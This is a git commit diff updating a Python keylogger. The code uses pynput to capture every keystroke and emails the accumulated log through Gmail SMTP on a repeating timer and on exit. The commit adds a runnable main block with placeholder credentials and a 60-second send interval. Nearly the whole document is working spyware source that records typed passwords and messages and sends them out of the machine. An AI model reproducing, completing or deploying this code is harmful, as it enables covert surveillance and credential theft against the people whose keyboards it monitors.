be9efbaa6e91ee761ee3dff8a5f69ecc60408998
S-Thanushri <141514253+S-Thanushri@users.noreply.github.com>
2023-09-17 11:20:45 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,36 +1,18 @@
-#!/usr/bin/env python
-
 import smtplib
-
 import threading
-
-import pynput
-
-# Create Keylogger Class
 from pynput import keyboard
 
-
 class KeyLogger:
-
-    # Define __init__ variables
-
     def __init__(self, time_interval: int, email: str, password: str) -> None:
-        """
-
-        :rtype: object
-        """
         self.interval = time_interval
-        self.log = "KeyLogger has started..."
+        self.log = "KeyLogger has started...\n"
         self.email = email
-        self.password = password
+        self.password = "generated_application_password_from_gmail_account"
 
-    # Create Log which all keystrokes will be appended to
 
     def append_to_log(self, string):
         assert isinstance(string, str)
-        self.log = self.log + string
-
-    # Create Keylogger
+        self.log += string
 
     def on_press(self, key):
         try:
@@ -39,39 +21,39 @@ class KeyLogger:
             if key == key.space:
                 current_key = " "
             elif key == key.esc:
+                self.send_mail("\n\n" + self.log)
                 print("Exiting program...")
                 return False
             else:
                 current_key = " " + str(key) + " "
-
         self.append_to_log(current_key)
 
+    def send_mail(self, message):
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(self.email, self.password)
+            server.sendmail(self.email, self.email, message)
+            server.quit()
+        except Exception as e:
+            print(f"Failed to send email: {str(e)}")
 
-    # Create underlying back structure which will publish emails
-
-    def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
-
-    # Create Report & Send Email
-
-    def report_n_send(self) -> str:
-        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
+    def report_n_send(self):
+        self.send_mail("\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report_n_send)
         timer.start()
 
-    # Start KeyLogger and Send Off Emails
-
-    def start(self) -> str:
-        """
-
-        :rtype: object
-        """
-        keyboard_listener = keyboard.Listener(on_press = self.on_press)
+    def start(self):
+        keyboard_listener = keyboard.Listener(on_press=self.on_press)
         with keyboard_listener:
             self.report_n_send()
             keyboard_listener.join()
+
+if __name__ == "__main__":
+    email_address = "your_mail"  # Replace with your Gmail address
+    email_password = "your_password"        # Replace with your Gmail password
+    interval = 60  # Set the time interval (in seconds) for sending logs via email
+    
+    keylogger = KeyLogger(interval, email_address, email_password)
+    keylogger.start()
